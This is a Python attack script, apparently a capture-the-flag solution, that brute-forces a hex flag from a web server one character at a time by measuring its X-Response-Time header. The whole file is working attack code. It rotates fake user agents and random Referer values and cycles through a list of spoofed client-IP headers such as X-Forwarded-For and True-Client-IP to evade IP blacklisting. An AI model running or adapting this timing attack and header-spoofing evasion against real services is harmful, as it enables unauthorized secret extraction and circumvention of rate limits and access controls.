import requests
import time
import random

user_agents = [
    "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19",
    "Mozilla/5.0 (Linux; Android 4.4.2; XMP-6250 Build/HAWK) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36 ADAPI/2.0 (UUID:9e7df0ed-2a5c-4a19-bec7-2cc54800f99d) RK3188-ADAPI/1.2.84.533 (MODEL:XMP-6250)",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1; Mi A1 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; vivo X7 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 baiduboxapp/8.6.5 (Baidu; P1 5.1.1)",
    "Mozilla/5.0 (Linux; Android 6.0.1; CPH1607 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36"
    "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; F5121 Build/34.0.A.1.247) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.5.1.944 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; vivo 1606 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; CAM-L21 Build/HUAWEICAM-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
    "Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
    "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; HUAWEI CUN-L22 Build/HUAWEICUN-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-J730GM Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; BLL-L22 Build/HUAWEIBLL-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-J710F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
]

bypass = [
    "CACHE_INFO: 127.0.0.1",
    "CF_CONNECTING_IP: 127.0.0.1",
    "CF-Connecting-IP: 127.0.0.1",
    "CLIENT_IP: 127.0.0.1",
    "Client-IP: 127.0.0.1",
    "COMING_FROM: 127.0.0.1",
    "CONNECT_VIA_IP: 127.0.0.1",
    "FORWARD_FOR: 127.0.0.1",
    "FORWARD-FOR: 127.0.0.1",
    "FORWARDED_FOR_IP: 127.0.0.1",
    "FORWARDED_FOR: 127.0.0.1",
    "FORWARDED-FOR-IP: 127.0.0.1",
    "FORWARDED-FOR: 127.0.0.1",
    "FORWARDED: 127.0.0.1",
    "HTTP-CLIENT-IP: 127.0.0.1",
    "HTTP-FORWARDED-FOR-IP: 127.0.0.1",
    "HTTP-PC-REMOTE-ADDR: 127.0.0.1",
    "HTTP-PROXY-CONNECTION: 127.0.0.1",
    "HTTP-VIA: 127.0.0.1",
    "HTTP-X-FORWARDED-FOR-IP: 127.0.0.1",
    "HTTP-X-IMFORWARDS: 127.0.0.1",
    "HTTP-XROXY-CONNECTION: 127.0.0.1",
    "PC_REMOTE_ADDR: 127.0.0.1",
    "PRAGMA: 127.0.0.1",
    "PROXY_AUTHORIZATION: 127.0.0.1",
    "PROXY_CONNECTION: 127.0.0.1",
    "Proxy-Client-IP: 127.0.0.1",
    "PROXY: 127.0.0.1",
    "REMOTE_ADDR: 127.0.0.1",
    "Source-IP: 127.0.0.1",
    "True-Client-IP: 127.0.0.1",
    "Via: 127.0.0.1",
    "VIA: 127.0.0.1",
    "WL-Proxy-Client-IP: 127.0.0.1",
    "X_CLUSTER_CLIENT_IP: 127.0.0.1",
    "X_COMING_FROM: 127.0.0.1",
    "X_DELEGATE_REMOTE_HOST: 127.0.0.1",
    "X_FORWARDED_FOR_IP: 127.0.0.1",
    "X_FORWARDED_FOR: 127.0.0.1",
    "X_FORWARDED: 127.0.0.1",
    "X_IMFORWARDS: 127.0.0.1",
    "X_LOCKING: 127.0.0.1",
    "X_LOOKING: 127.0.0.1",
    "X_REAL_IP: 127.0.0.1",
    "X-Backend-Host: 127.0.0.1",
    "X-BlueCoat-Via: 127.0.0.1",
    "X-Cache-Info: 127.0.0.1",
    "X-Forward-For: 127.0.0.1",
    "X-Forwarded-By: 127.0.0.1",
    "X-Forwarded-For-Original: 127.0.0.1",
    "X-Forwarded-For: 127.0.0.1",
    "X-Forwarded-For: 127.0.0.1, 127.0.0.1, 127.0.0.1",
    "X-Forwarded-Server: 127.0.0.1",
    "X-Forwarded-Host: 127.0.0.1",
    "X-From-IP: 127.0.0.1",
    "X-From: 127.0.0.1",
    "X-Gateway-Host: 127.0.0.1",
    "X-Host: 127.0.0.1",
    "X-Ip: 127.0.0.1",
    "X-Original-Host: 127.0.0.1",
    "X-Original-IP: 127.0.0.1",
    "X-Original-Remote-Addr: 127.0.0.1",
    "X-Original-Url: 127.0.0.1",
    "X-Originally-Forwarded-For: 127.0.0.1",
    "X-Originating-IP: 127.0.0.1",
    "X-ProxyMesh-IP: 127.0.0.1",
    "X-ProxyUser-IP: 127.0.0.1",
    "X-Real-IP: 127.0.0.1",
    "X-Remote-Addr: 127.0.0.1",
    "X-Remote-IP: 127.0.0.1",
    "X-True-Client-IP: 127.0.0.1",
    "XONNECTION: 127.0.0.1",
    "XPROXY: 127.0.0.1",
    "XROXY_CONNECTION: 127.0.0.1",
    "Z-Forwarded-For: 127.0.0.1",
    "ZCACHE_CONTROL: 127.0.0.1",
]

with open("guessing.txt", "r") as f:
    guessing = f.readlines()

with open("response_times.txt", "r") as f:
    response_times = f.readlines()

IP = "10.1.244.117"
xResponseTime = "1"
j = 0

while True:
    for i in range(0, 16):
        char = format(i, "x")
        print("Trying character: " + char)
        URL = "http://{}/submit?random={}&flag=flag%7B{}{}".format(
            IP, random.randint(1, 100), guessing[0].strip(), char
        )
        r = requests.get(
            url=URL,
            headers={
                "User-Agent": user_agents[i % len(user_agents)],
                "Referer": "http://{}.{}.{}.{}".format(
                    random.randint(1, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(1, 255),
                ),
                bypass[j % len(bypass)].split(": ")[0]: "{}".format(IP),
            },
        )
        j += 1
        headers = r.headers
        xResponseTime = headers.get("X-Response-Time")
        print("X-Response-Time: " + xResponseTime)
        if float(xResponseTime) < 0.5:
            print("IP Blacklisted...")
            charNew = format(i, "x")
            print("Last character was: " + charNew)
            break
        if (float(response_times[0].strip()) + 0.09) < float(xResponseTime) and float(
            xResponseTime
        ) > 1:
            guessing[0] = guessing[0].strip() + char
            with open("guessing.txt", "w") as f:
                f.write(guessing[0] + "\n")
            with open("response_times.txt", "w") as f:
                f.write(xResponseTime + "\n")
            print("Found new part of the flag: " + "flag{" + guessing[0])
            print(r.request.url)
            print("Flag has "+ str(len(guessing[0])) + " characters")
            break
